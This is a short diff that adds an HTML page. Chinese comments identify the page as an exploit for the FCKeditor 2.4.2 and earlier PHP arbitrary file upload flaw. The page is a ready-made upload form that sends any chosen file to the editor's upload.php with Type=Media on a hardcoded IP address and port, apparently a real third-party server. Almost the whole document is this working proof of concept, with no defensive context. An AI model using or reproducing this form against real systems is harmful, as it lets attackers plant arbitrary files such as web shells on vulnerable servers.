@@ -1,0 +1,8 @@
+<!DOCTYPE html>
+<html lang="en">
+<!--FckEditor编辑器<=2.4.2 PHP版本上传漏洞-->
+<!--编辑器未对Media类型进行上传文件类型的控制，导致用户能够上传任意文件。-->
+<body>
+<form id="frmUpload" enctype="multipart/form-data"action="http://113.108.70.111:60684/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media" method="post">Upload a new file:<br><input type="file" name="NewFile" size="50"><br><input id="btnUpload" type="submit" value="Upload"></form>
+</body>
+</html>
